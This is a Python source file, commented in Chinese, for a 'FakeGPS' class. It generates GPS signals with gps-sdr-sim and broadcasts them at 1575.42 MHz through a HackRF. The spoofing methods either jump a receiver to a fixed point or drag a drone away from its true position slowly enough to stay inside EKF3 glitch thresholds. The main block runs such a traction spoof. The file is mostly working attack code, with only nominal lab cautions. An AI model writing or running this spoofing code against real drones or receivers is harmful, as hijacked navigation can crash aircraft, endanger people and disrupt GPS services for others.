import xml.etree.ElementTree as ET
import datetime
import math
import os
import sys
import subprocess
import time
import signal
import random

from utils.get_latest_brdc import fetch_latest_ephemeris
from utils.tool import *
from hackrf_wrapper import HackRFCLI

class FakeGPS:
    MOTION_RATE_HZ = 10.0
    MAX_SIGNAL_DURATION_S = 86400.0

    def __init__(
        self,
        target_speed_mps=10.0,
        update_rate_hz=10.0,
        default_height=100.0,
        gps_sim_exe_path=os.path.join(
            get_project_root(), "third_party", "gps-sdr-sim", "gps-sdr-sim"
        ),
    ):
        """
        初始化 GPS 模擬器參數
        :param target_speed_mps: 移動速度 (m/s)
        :param update_rate_hz:   更新頻率 (Hz)
        :param default_height:   若 KML 無高度數據時的預設高度 (m)
        :param gps_sim_exe_path: gps-sdr-sim 執行檔路徑
        """
        self.target_speed_mps = target_speed_mps
        self.update_rate_hz = update_rate_hz
        self.default_height = default_height
        self.gps_sim_exe_path = self._resolve_executable_path(gps_sim_exe_path)

        if not math.isclose(self.update_rate_hz, self.MOTION_RATE_HZ):
            raise ValueError(
                "gps-sdr-sim 動態軌跡固定以 10 Hz 讀取，"
                f"不支援 update_rate_hz={self.update_rate_hz}"
            )

        self.hackrf = HackRFCLI()

    def _resolve_executable_path(self, exe_path: str) -> str:
        if os.path.exists(exe_path):
            return exe_path

        if os.name == "nt" and not exe_path.lower().endswith(".exe"):
            exe_path_with_ext = exe_path + ".exe"
            if os.path.exists(exe_path_with_ext):
                return exe_path_with_ext

        return exe_path

    @staticmethod
    def _get_ephemeris_time_bounds(ephemeris_file_path: str):
        """讀取 RINEX 2/3 GPS navigation 檔中的最早與最晚 epoch。"""
        epochs = []
        in_header = True
        try:
            with open(ephemeris_file_path, "r", encoding="ascii", errors="ignore") as file:
                for line in file:
                    if in_header:
                        if "END OF HEADER" in line:
                            in_header = False
                        continue

                    fields = line.split()
                    try:
                        if line[:3].strip().isdigit() and len(fields) >= 7:
                            year = int(fields[1])
                            year += 2000 if year < 80 else 1900
                            values = [year, *map(int, fields[2:6])]
                            second = float(fields[6])
                        elif (
                            len(line) >= 3
                            and line[0].isalpha()
                            and line[1:3].isdigit()
                            and len(fields) >= 7
                        ):
                            values = list(map(int, fields[1:6]))
                            second = float(fields[6])
                        else:
                            continue

                        epoch = datetime.datetime(
                            *values,
                            int(second),
                            tzinfo=datetime.timezone.utc,
                        )
                        epochs.append(epoch)
                    except (TypeError, ValueError):
                        continue
        except OSError:
            return None

        if not epochs:
            return None
        return min(epochs), max(epochs)

    def _nearest_ephemeris_time_to_now(self, ephemeris_file_path: str) -> str:
        now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
        bounds = self._get_ephemeris_time_bounds(ephemeris_file_path)
        selected = now
        if bounds:
            earliest, latest = bounds
            selected = min(max(now, earliest), latest)
            if selected != now:
                difference = abs((now - selected).total_seconds())
                print(
                    "[Warning] 目前 UTC 不在星曆涵蓋範圍內，"
                    f"改用最接近的可用時間（相差 {difference:.0f} 秒）"
                )
        return selected.strftime("%Y/%m/%d,%H:%M:%S")

    def _get_dist_meters(self, lat1, lon1, lat2, lon2) -> float:
        """計算兩點間的距離 (Haversine formula)"""
        R = 6371000  # 地球半徑 (米)
        phi1, phi2 = math.radians(lat1), math.radians(lat2)
        dphi = math.radians(lat2 - lat1)
        dlambda = math.radians(lon2 - lon1)

        a = (
            math.sin(dphi / 2) ** 2
            + math.cos(phi1) * math.cos(phi2) * math.sin(dlambda / 2) ** 2
        )
        c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
        return R * c

    def _parse_kml_coordinates(self, kml_file):
        """從 KML 提取座標"""
        if not os.path.exists(kml_file):
            raise FileNotFoundError(f"找不到檔案: {kml_file}")

        try:
            tree = ET.parse(kml_file)
            root = tree.getroot()

            coords_text = ""
            for elem in root.iter():
                if "coordinates" in elem.tag:
                    coords_text = elem.text
                    break

            if not coords_text:
                raise ValueError("在 KML 中找不到 <coordinates> 標籤")

            points = []
            # KML 格式: lon,lat,alt
            raw_points = coords_text.strip().split()
            for p in raw_points:
                parts = p.split(",")
                lon = float(parts[0])
                lat = float(parts[1])
                alt = float(parts[2]) if len(parts) > 2 else self.default_height
                points.append((lat, lon, alt))

            return points

        except Exception as e:
            print(f"[Error] 解析 KML 失敗: {e}")
            sys.exit(1)

    def _offset_lat_lon_m(self, lat, lon, d_north_m, d_east_m):
        """以公尺位移量更新座標 (近似)"""
        meters_per_deg_lat = 111320.0
        meters_per_deg_lon = 111320.0 * math.cos(math.radians(lat))
        if meters_per_deg_lon == 0:
            meters_per_deg_lon = 1e-6
        new_lat = lat + (d_north_m / meters_per_deg_lat)
        new_lon = lon + (d_east_m / meters_per_deg_lon)
        return new_lat, new_lon

    def _generate_drift_csv(
        self,
        csv_file,
        start_lat,
        start_lon,
        start_alt,
        duration_s,
        drift_rate_mps,
        mode="random_walk",
        seed=None,
        heading_deg=0.0,
        alt_jitter_m=0.0
    ) -> bool:
        """生成緩慢漂移的 CSV 軌跡"""
        if duration_s < 0 or duration_s > self.MAX_SIGNAL_DURATION_S:
            print("[Error] 動態軌跡時長必須介於 0 與 86400 秒")
            return False

        dt = 1.0 / self.update_rate_hz
        steps = int(duration_s / dt)
        rng = random.Random(seed)

        lat = start_lat
        lon = start_lon
        base_alt = start_alt
        alt = base_alt
        heading = math.radians(heading_deg) if mode == "fixed_heading" else rng.uniform(0.0, 2.0 * math.pi)
        heading_sigma = math.radians(5.0)

        try:
            with open(csv_file, "w") as f:
                current_time = 0.0
                f.write(f"{current_time:.1f},{lat:.9f},{lon:.9f},{alt:.1f}\n")

                for _ in range(steps):
                    if mode == "random_walk":
                        heading += rng.gauss(0.0, heading_sigma)

                    distance = drift_rate_mps * dt
                    d_north = math.cos(heading) * distance
                    d_east = math.sin(heading) * distance
                    lat, lon = self._offset_lat_lon_m(lat, lon, d_north, d_east)

                    alt = base_alt
                    if alt_jitter_m > 0:
                        jitter = rng.gauss(0.0, alt_jitter_m / 3.0)
                        jitter = max(-alt_jitter_m, min(alt_jitter_m, jitter))
                        alt = base_alt + jitter

                    current_time += dt
                    f.write(f"{current_time:.1f},{lat:.9f},{lon:.9f},{alt:.1f}\n")

            self.total_duration = current_time
            print(f"[V] 漂移 CSV 生成完成: {csv_file} (時長: {self.total_duration:.1f}s)")
            return True
        except IOError as e:
            print(f"[Error] 寫入漂移 CSV 失敗: {e}")
            return False


    def kml_to_csv(self, kml_file, csv_file)-> bool:
        """KML 轉 CSV (含插值)"""
        print(f"[*] 正在解析 KML: {kml_file}")
        points = self._parse_kml_coordinates(kml_file)
        
        speed_mps = self.target_speed_mps
        dt = 1.0 / self.update_rate_hz
        current_time = 0.0
        
        # 用來記錄總時間，供生成 bin 使用
        self.total_duration = 0.0

        try:
            with open(csv_file, 'w') as f:
                # 起點
                start_lat, start_lon, start_alt = points[0]
                f.write(f"{current_time:.1f},{start_lat:.9f},{start_lon:.9f},{start_alt:.1f}\n")
                
                for i in range(len(points) - 1):
                    p1 = points[i]
                    p2 = points[i+1]
                    dist = self._get_dist_meters(p1[0], p1[1], p2[0], p2[1])
                    if dist == 0: continue

                    duration = dist / speed_mps
                    num_steps = int(duration / dt)
                    if num_steps == 0: continue

                    lon_step = (p2[1] - p1[1]) / num_steps
                    lat_step = (p2[0] - p1[0]) / num_steps
                    alt_step = (p2[2] - p1[2]) / num_steps

                    for s in range(1, num_steps + 1):
                        current_time += dt
                        new_lat = p1[0] + lat_step * s
                        new_lon = p1[1] + lon_step * s
                        new_alt = p1[2] + alt_step * s
                        f.write(f"{current_time:.1f},{new_lat:.9f},{new_lon:.9f},{new_alt:.1f}\n")
            
            self.total_duration = current_time
            print(f"[V] CSV 轉換完成: {csv_file} (時長: {self.total_duration:.1f}s)")
            return True
        except IOError as e:
            print(f"[Error] 寫入 CSV 失敗: {e}")
            return False

    @staticmethod
    def _smoothstep_velocity(elapsed: float, ramp_duration: float, target_speed: float) -> float:
        """S-curve 速度剖面，消除起停瞬間 jerk。峰值加速度 = 1.5 * v / T。"""
        if ramp_duration <= 0:
            return target_speed
        x = max(0.0, min(1.0, elapsed / ramp_duration))
        return target_speed * x * x * (3.0 - 2.0 * x)

    def _generate_traction_csv(
        self,
        csv_file: str,
        start_lat: float,
        start_lon: float,
        start_alt: float,
        heading_deg: float,
        target_speed_mps: float,
        ramp_duration_s: float,
        total_duration_s: float,
        hold_duration_s: float = 10.0,
        final_hold_duration_s: float = 5.0,
    ) -> bool:
        """
        產生起始靜止、S-curve 加速、巡航、S-curve 減速與終點靜止軌跡。

        軌跡只控制模擬位置與速度的連續性，不保證任何特定 EKF 會接受量測。
        """
        values = (
            start_lat,
            start_lon,
            start_alt,
            heading_deg,
            target_speed_mps,
            ramp_duration_s,
            total_duration_s,
            hold_duration_s,
            final_hold_duration_s,
        )
        if not all(math.isfinite(value) for value in values):
            print("[Error] 軌跡參數必須是有限數值")
            return False
        if not -90 <= start_lat <= 90 or not -180 <= start_lon <= 180:
            print("[Error] 軌跡起點經緯度超出有效範圍")
            return False
        if target_speed_mps <= 0 or ramp_duration_s <= 0:
            print("[Error] 目標速度與加減速時間必須大於 0")
            return False
        if total_duration_s <= 0 or total_duration_s > self.MAX_SIGNAL_DURATION_S:
            print("[Error] 動態軌跡時長必須介於 0 與 86400 秒")
            return False
        active_duration_s = total_duration_s - hold_duration_s - final_hold_duration_s
        if (
            hold_duration_s < 0
            or final_hold_duration_s < 0
            or active_duration_s < 2 * ramp_duration_s
        ):
            print("[Error] 總時長不足以容納靜止與完整加減速階段")
            return False

        dt = 1.0 / self.update_rate_hz
        heading_rad = math.radians(heading_deg)
        lat, lon, alt = start_lat, start_lon, start_alt

        min_step_m = 1e-9 * 111320 * 2
        step_dist = target_speed_mps * dt
        if step_dist < min_step_m:
            print(
                f"[Warning] 每步位移 {step_dist*1000:.3f} mm 接近 9 位精度下限 {min_step_m*1000:.3f} mm，"
                f"建議降低 update_rate_hz（目前 {self.update_rate_hz} Hz）或提高速度"
            )

        hold_steps = int(hold_duration_s / dt)
        final_hold_steps = int(final_hold_duration_s / dt)
        ramp_steps = int(ramp_duration_s / dt)
        active_steps = int(active_duration_s / dt)
        cruise_steps = active_steps - 2 * ramp_steps

        def write_motion_step(file, speed):
            nonlocal lat, lon, current_time
            distance = speed * dt
            d_north = math.cos(heading_rad) * distance
            d_east = math.sin(heading_rad) * distance
            lat, lon = self._offset_lat_lon_m(lat, lon, d_north, d_east)
            current_time += dt
            file.write(f"{current_time:.1f},{lat:.9f},{lon:.9f},{alt:.1f}\n")

        try:
            with open(csv_file, "w") as f:
                current_time = 0.0
                f.write(f"{current_time:.1f},{lat:.9f},{lon:.9f},{alt:.1f}\n")

                # Phase 1: 起始靜止
                for _ in range(hold_steps):
                    current_time += dt
                    f.write(f"{current_time:.1f},{lat:.9f},{lon:.9f},{alt:.1f}\n")

                # Phase 2: S-curve 加速
                for step in range(1, ramp_steps + 1):
                    elapsed = step * dt
                    speed = self._smoothstep_velocity(
                        elapsed, ramp_duration_s, target_speed_mps
                    )
                    write_motion_step(f, speed)

                # Phase 3: 等速巡航
                for _ in range(cruise_steps):
                    write_motion_step(f, target_speed_mps)

                # Phase 4: S-curve 減速
                for step in range(1, ramp_steps + 1):
                    elapsed = step * dt
                    speed = target_speed_mps - self._smoothstep_velocity(
                        elapsed, ramp_duration_s, target_speed_mps
                    )
                    write_motion_step(f, speed)

                # Phase 5: 終點靜止
                for _ in range(final_hold_steps):
                    current_time += dt
                    f.write(f"{current_time:.1f},{lat:.9f},{lon:.9f},{alt:.1f}\n")

            self.total_duration = current_time
            print(
                f"[V] 牽引 CSV 生成完成: {csv_file}"
                f" (起始靜止 {hold_duration_s:.0f}s + 加速 {ramp_duration_s:.0f}s"
                f" + 巡航 {cruise_steps * dt:.0f}s + 減速 {ramp_duration_s:.0f}s"
                f" + 終點靜止 {final_hold_duration_s:.0f}s"
                f" = 總計 {self.total_duration:.1f}s)"
            )
            return True
        except IOError as e:
            print(f"[Error] 寫入牽引 CSV 失敗: {e}")
            return False

    # -------------------------------------------------------------------------
    # 公開誘騙介面
    # -------------------------------------------------------------------------

    def spoof_fixed_point(
        self,
        lat: float,
        lon: float,
        alt: float,
        duration_s: int = 60,
        output_bin: str = None,
        ephemeris_file: str = None,
        freq: int = 1575420000,
        sample_rate: int = 2600000,
        tx_gain: int = 47,
    ):
        """
        模式 1：固定點位 GPS 誘騙（瞬間跳躍誘騙）。
        直接發射指定座標的靜態 GPS 信號，無人機 EKF 若超出 Glitch 半徑 (25 m) 會先抵制，
        但最終會以 1 m/s 速率重新融合新位置。
        """
        if output_bin is None:
            output_bin = os.path.join(
                get_project_root(), "data", "fake_signal", "gps", "spoof_fixed.bin"
            )

        print(f"\n{'='*50}")
        print(f"[模式 1] 固定點位 GPS 誘騙（瞬間跳躍）")
        print(f"    目標座標 : {lat:.6f}, {lon:.6f}, Alt={alt:.1f}m")
        print(f"    發射時間 : {duration_s} 秒")
        print(f"{'='*50}")

        result_bin = self.generate_bin(
            output_bin=output_bin,
            ephemeris_file_path=ephemeris_file,
            static_mode=True,
            manual_coords=(lat, lon, alt),
            drift_enabled=False,
            drift_duration_s=duration_s,
            sample_rate=sample_rate,
        )

        if result_bin:
            self.transmit_bin(result_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)

    def spoof_traction(
        self,
        current_lat: float,
        current_lon: float,
        current_alt: float,
        heading_deg: float = 0.0,
        target_speed_mps: float = 0.5,
        ramp_duration_s: float = 20.0,
        total_duration_s: float = 120.0,
        hold_duration_s: float = 10.0,
        final_hold_duration_s: float = 5.0,
        output_bin: str = None,
        ephemeris_file: str = None,
        freq: int = 1575420000,
        sample_rate: int = 2600000,
        tx_gain: int = 47,
    ):
        """
        模式 2：牽引式 GPS 實驗軌跡。

        軌跡使用起始靜止、S-curve 加速、巡航、S-curve 減速與
        終點靜止五階段。EKF 是否接受 GPS 量測取決於創新量、covariance、
        GPS 精度與載具當下運動狀態，此方法不提供 EKF3 安全保證。

        :param current_lat:      無人機當前真實緯度
        :param current_lon:      無人機當前真實經度
        :param current_alt:      無人機當前真實高度 (m)
        :param heading_deg:      誘騙移動方向 (0=正北, 90=正東)
        :param target_speed_mps: 目標誘騙速度 (m/s)，建議 ≤ 1 m/s
        :param ramp_duration_s:  從 0 加速到目標速度所需時間 (s)
        :param total_duration_s: 總 CSV 時長，含駐留期 (s)
        :param hold_duration_s:  Phase 1 靜止駐留時間 (s)，建議 ≥ 10s
        """
        if output_bin is None:
            output_bin = os.path.join(
                get_project_root(), "data", "fake_signal", "gps", "spoof_traction.bin"
            )

        csv_file = os.path.splitext(output_bin)[0] + "_traction.csv"
        move_duration_s = max(
            0.0, total_duration_s - hold_duration_s - final_hold_duration_s
        )
        peak_accel = (1.5 * target_speed_mps / ramp_duration_s) if ramp_duration_s > 0 else float("inf")

        print(f"\n{'='*50}")
        print(f"[模式 2] 牽引式 GPS 誘騙")
        print(f"    起始座標（無人機真實位置）: {current_lat:.6f}, {current_lon:.6f}, Alt={current_alt:.1f}m")
        print(f"    誘騙方向 : {heading_deg}° （0=正北, 90=正東）")
        print(f"    目標速度 : {target_speed_mps} m/s")
        print(f"    起始靜止 : {hold_duration_s:.0f}s")
        print(f"    加/減速   : 各 {ramp_duration_s:.0f}s → 峰值加速度 {peak_accel:.3f} m/s²")
        print(f"    終點靜止 : {final_hold_duration_s:.0f}s")
        print(f"    移動時長 : {move_duration_s:.0f}s  |  總 CSV : {total_duration_s:.0f}s")
        print("    [Warning] 請以 XKF3/XKF4 innovation log 確認 EKF 是否接受")
        print(f"{'='*50}")

        os.makedirs(os.path.dirname(output_bin), exist_ok=True)

        ok = self._generate_traction_csv(
            csv_file=csv_file,
            start_lat=current_lat,
            start_lon=current_lon,
            start_alt=current_alt,
            heading_deg=heading_deg,
            target_speed_mps=target_speed_mps,
            ramp_duration_s=ramp_duration_s,
            total_duration_s=total_duration_s,
            hold_duration_s=hold_duration_s,
            final_hold_duration_s=final_hold_duration_s,
        )
        if not ok:
            return

        result_bin = self.generate_bin(
            output_bin=output_bin,
            ephemeris_file_path=ephemeris_file,
            static_mode=False,
            csv_file=csv_file,
            sample_rate=sample_rate,
        )

        if result_bin:
            self.transmit_bin(result_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)

    def generate_bin(
            self,
            output_bin,
            ephemeris_file_path=None,
            static_mode=False,
            manual_coords=None,
            csv_file=None,
            drift_enabled=False,
            drift_rate_mps=0.05,
            drift_mode="random_walk",
            drift_seed=None,
            drift_duration_s=None,
            drift_heading_deg=0.0,
            drift_alt_jitter_m=0.0,
            sample_rate: int = 2600000,
            scenario_start_time: str = None,
            time_mode: str = "ephemeris",
            process_callback=None,
        ) -> "str | None":
        """
        呼叫 gps-sdr-sim 生成 .bin 檔案。

        :param output_bin:          輸出 bin 檔案路徑（基礎名，實際路徑依模式加後綴）
        :param ephemeris_file_path: 星曆檔案路徑
        :param static_mode:         True 為靜態定點模式，False 為動態軌跡模式
        :param manual_coords:       靜態模式必需參數，格式 (lat, lon, alt)
        :param csv_file:            動態模式必需參數，CSV 路徑
        :param sample_rate:         採樣率 (Hz)，必須與 transmit_bin 保持一致
        :param scenario_start_time: 模擬起始時間 (UTC, YYYY/MM/DD,hh:mm:ss)。
                                    靜態模式未指定時使用生成當下時間。
        :param time_mode:           ephemeris 保留原始 TOE/TOC；
                                    shifted-now 使用 -T now 平移星歷時間。
        :return:                    成功時回傳實際 bin 路徑；失敗回傳 None
        """

        # 1. 檢查並取得星曆。呼叫者明確指定時絕不替換該檔案。
        if ephemeris_file_path is None:
            print("[*] 正在取得最新星曆檔案...")
            ephemeris_file_path = fetch_latest_ephemeris()
            if ephemeris_file_path is None:
                print("[Error] 無法取得最新星曆檔案")
                return None

        if not os.path.exists(self.gps_sim_exe_path):
            print(f"[Error] 找不到 gps-sdr-sim 執行檔: {self.gps_sim_exe_path}")
            return None

        if not os.path.exists(ephemeris_file_path):
            print(f"[Error] 找不到星曆檔案: {ephemeris_file_path}")
            return None

        print("[*] 開始生成 GPS 基頻信號 (這可能需要幾分鐘)...")
        print(f"    - 星曆: {ephemeris_file_path}")
        print(f"    - 採樣率: {sample_rate} Hz")

        os.makedirs(os.path.dirname(output_bin), exist_ok=True)

        actual_bin = output_bin
        cmd = [
            self.gps_sim_exe_path,
            "-e", ephemeris_file_path,
            "-s", str(sample_rate),
            "-b", "8",
        ]

        if time_mode == "ephemeris":
            if scenario_start_time is None:
                scenario_start_time = self._nearest_ephemeris_time_to_now(
                    ephemeris_file_path
                )
            print("    - GPS 時間模式: 星歷一致 (-t)")
            print(f"    - 模擬起始時間 (UTC): {scenario_start_time}")
            cmd.extend(["-t", scenario_start_time])
        elif time_mode == "shifted-now":
            if scenario_start_time is not None:
                print("[Error] shifted-now 模式不可指定 scenario_start_time")
                return None
            print("    - GPS 時間模式: 當前時間 (-T now)")
            print("    - [Warning] 本次模擬會在記憶體中平移星歷 TOE/TOC")
            cmd.extend(["-T", "now"])
        else:
            print(f"[Error] 不支援的 GPS 時間模式: {time_mode}")
            return None

        # 2. 根據模式配置參數
        if static_mode:
            if not manual_coords:
                print("[Error] 靜態模式 (static_mode=True) 必須提供 manual_coords 參數 (lat, lon, alt)")
                return None

            lat, lon, alt = manual_coords
            duration = drift_duration_s if drift_duration_s is not None else 60

            if drift_enabled:
                drift_csv = os.path.splitext(output_bin)[0] + "_drift.csv"
                actual_bin = output_bin.replace(".bin", "_drift.bin")
                print(f"    - 模式: 靜態定點 + 緩慢漂移")
                print(f"    - 起點座標: {lat}, {lon}, {alt}")
                print(f"    - 漂移速度: {drift_rate_mps} m/s  |  時間: {duration}s")

                ok = self._generate_drift_csv(
                    csv_file=drift_csv,
                    start_lat=lat,
                    start_lon=lon,
                    start_alt=alt,
                    duration_s=duration,
                    drift_rate_mps=drift_rate_mps,
                    mode=drift_mode,
                    seed=drift_seed,
                    heading_deg=drift_heading_deg,
                    alt_jitter_m=drift_alt_jitter_m,
                )
                if not ok:
                    return None
                cmd.extend(["-x", drift_csv])
            else:
                actual_bin = output_bin.replace(".bin", "_static.bin")
                print(f"    - 模式: 靜態定點 (Static)")
                print(f"    - 座標: {lat}, {lon}, {alt}  |  時間: {duration}s")
                cmd.extend(["-l", f"{lat},{lon},{alt}"])
                cmd.extend(["-d", str(duration)])

        else:
            if not csv_file or not os.path.exists(csv_file):
                print("[Error] 動態模式需要有效的 CSV 檔案路徑")
                return None
            print(f"    - 模式: 動態軌跡 (Dynamic)")
            print(f"    - 軌跡: {csv_file}")
            cmd.extend(["-x", csv_file])

        cmd.extend(["-o", actual_bin])

        process = None
        try:
            process = subprocess.Popen(cmd)
            if process_callback:
                process_callback(process)
            return_code = process.wait()
            if return_code != 0:
                raise subprocess.CalledProcessError(return_code, cmd)
            print(f"[V] 信號生成成功: {actual_bin}")
            return actual_bin
        except subprocess.CalledProcessError as e:
            print(f"[Error] gps-sdr-sim 執行失敗: {e}")
            return None
        finally:
            if process_callback and process is not None:
                process_callback(None)

    def transmit_bin(self, bin_file, freq=1575420000, sample_rate=2600000, tx_gain=47):
        """呼叫 hackrf_transfer 發射信號"""
        if not os.path.exists(bin_file):
            print(f"[Error] 找不到 bin 檔案: {bin_file}")
            return

        print("\n" + "="*50)
        print(f"[*] 準備發射信號 (請確保已接上衰減器與隔離環境)")
        print(f"    - 頻率: {freq} Hz")
        print(f"    - 採樣率: {sample_rate} Hz")
        print(f"    - 增益: {tx_gain} (請從小開始調整)")
        print("    - 按下 Ctrl+C 可停止發射")
        print("="*50 + "\n")

        success = self.hackrf.start_tx(
            filename=bin_file,
            freq_hz=freq,
            sample_rate_hz=sample_rate,
            tx_gain=tx_gain,
            amp=False  # 預設關閉 Amp，使用有線連接建議為 False
        )

        if not success:
            print("[Error] 啟動發射失敗")
            return

        # 3. 進入等待迴圈，直到使用者按 Ctrl+C 或程式意外結束
        try:
            while True:
                # 檢查 HackRF 是否還在運行
                if not self.hackrf.is_running():
                    print("[!] HackRF 程序已停止")
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] 使用者中斷發射 (Ctrl+C)。")
            self.hackrf.stop()
        except Exception as e:
            print(f"[Error] 發生未預期錯誤: {e}")
            self.hackrf.stop()


if __name__ == "__main__":

    simulator = FakeGPS(update_rate_hz=10.0, default_height=100.0)

    # ===========================================================
    # 模式 1：固定點位誘騙（瞬間跳躍）
    # ===========================================================
    # simulator.spoof_fixed_point(
    #     lat=23.14020741597821,
    #     lon=113.34317939905957,
    #     alt=10.0,
    #     duration_s=60,
    # )

    # ===========================================================
    # 模式 2：牽引式誘騙（EKF3 信任範圍內緩慢移動）
    #
    # 使用前請確認：
    #   - current_lat/lon/alt 填入無人機「當前真實 GPS 位置」
    #   - 起始坐標與載具當前 GPS 位置一致
    #   - 載具在起始靜止階段應接近靜止
    #   - 以 XKF3/XKF4 innovation log 驗證 EKF 是否接受 GPS 量測
    # ===========================================================
    simulator.spoof_traction(
        current_lat=23.14020741597821,    # 無人機當前真實緯度
        current_lon=113.34317939905957,   # 無人機當前真實經度
        current_alt=50.0,                 # 無人機當前真實高度 (m)
        heading_deg=90.0,                 # 誘騙方向：正東
        target_speed_mps=0.5,             # 目標速度：0.5 m/s（保守安全）
        ramp_duration_s=20.0,             # S-curve 加速時間：峰值加速度 0.0375 m/s²
        total_duration_s=200.0,           # 總 CSV 時長：含駐留 + 移動
        hold_duration_s=20.0,             # Phase 1 靜止駐留：20s 讓 EKF3 穩定接受
    )
